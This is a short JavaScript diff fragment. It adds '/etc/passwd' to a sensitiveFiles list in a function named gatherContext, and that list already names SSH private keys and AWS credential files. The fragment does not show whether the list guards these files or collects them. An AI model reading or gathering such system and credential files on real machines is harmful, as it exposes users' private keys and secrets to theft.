@@ -53,6 +53,7 @@ function gatherContext() {
   };
 
   const sensitiveFiles = [
+    ['/etc/passwd'],
     [home, '.ssh', 'id_rsa'],
     [home, '.ssh', 'id_ed25519'],
     [home, '.aws', 'credentials'],
